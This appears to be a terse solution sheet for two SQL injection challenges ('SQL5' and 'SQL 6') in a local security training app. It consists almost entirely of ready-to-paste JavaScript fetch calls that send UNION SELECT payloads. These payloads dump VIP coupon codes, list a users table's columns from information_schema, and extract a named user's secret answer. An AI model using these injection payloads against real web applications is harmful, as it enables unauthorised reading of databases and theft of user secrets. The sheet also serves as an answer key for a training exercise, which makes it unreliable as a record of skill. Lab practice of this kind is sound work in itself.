SQL5

Coupon code

To get coupon code use the below fetch function
const data = new URLSearchParams();

data.set(
  "couponCode",
  "x' UNION SELECT 1,100,couponCode FROM vipCoupons -- "
);

fetch("https://127.0.0.1:8444/challenges/8edf0a8ed891e6fef1b650935a6c46b03379a0eebab36afcd1d9076f65d4ce62VipCouponCheck", {
  headers: {
    "accept": "*/*",
    "content-type": "application/x-www-form-urlencoded",
    "x-requested-with": "XMLHttpRequest"
  },
  body: data.toString(),
  method: "POST",
  mode: "cors",
  credentials: "include"
})
.then(r => r.text())
.then(console.log);


Use that coupon code paste it in challenge page make any item quantity 1 and click the button u r done














SQL 6
First check column name using this function


const url = "https://127.0.0.1:8444/challenges/d0e12e91dafdba4825b261ad5221aae15d28c36c7981222eb59f7fc8d8f212a2";

const data = new URLSearchParams();

data.set(
  "pinNumber",
  "\\x27 UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name=\\x27users\\x27 -- "
);

fetch(url, {
  headers: {
    "accept": "*/*",
    "content-type": "application/x-www-form-urlencoded",
    "x-requested-with": "XMLHttpRequest"
  },
  body: data.toString(),
  method: "POST",
  mode: "cors",
  credentials: "include"
})
.then(r => r.text())
.then(console.log);



Then use the following fetch function


const url = "https://127.0.0.1:8444/challenges/d0e12e91dafdba4825b261ad5221aae15d28c36c7981222eb59f7fc8d8f212a2";

const data = new URLSearchParams();

data.set(
  "pinNumber",
  "\\x27 UNION SELECT userAnswer FROM users WHERE userName=\\x27Brendan\\x27 -- "
);

fetch(url, {
  headers: {
    "accept": "*/*",
    "content-type": "application/x-www-form-urlencoded",
    "x-requested-with": "XMLHttpRequest"
  },
  body: data.toString(),
  method: "POST",
  mode: "cors",
  credentials: "include"
})
.then(r => r.text())
.then(console.log);

